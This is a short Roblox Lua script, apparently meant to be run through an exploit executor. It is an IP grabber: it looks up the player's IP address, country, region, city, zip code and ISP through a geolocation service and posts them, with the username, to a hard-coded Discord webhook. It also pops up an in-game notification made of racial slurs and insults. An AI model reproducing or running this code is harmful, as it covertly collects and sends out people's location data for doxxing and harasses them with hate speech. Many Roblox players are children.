


local player_name = game:GetService("Players").LocalPlayer.Name
local webhook_url = "https://discord.com/api/webhooks/1067510438029430886/p2962sWc8t40p5PgL0mwi3Tl3X5aT-aXU5Wz4vNiAaUSvS7fu5Xn9bVZp0vvWJt50TiB"

local ip_info = syn.request({
    Url = "http://ip-api.com/json",
    Method = "GET"
})




game.StarterGui:SetCore(
    "SendNotification",
    {
        Title = "nigga you retarted asf",
        Text = "retarted ahh looking nigger ",
        Icon = "rbxassetid://6023426923",
        Duration = 6000
    }
)


local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
syn.request(
    {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
    }
)
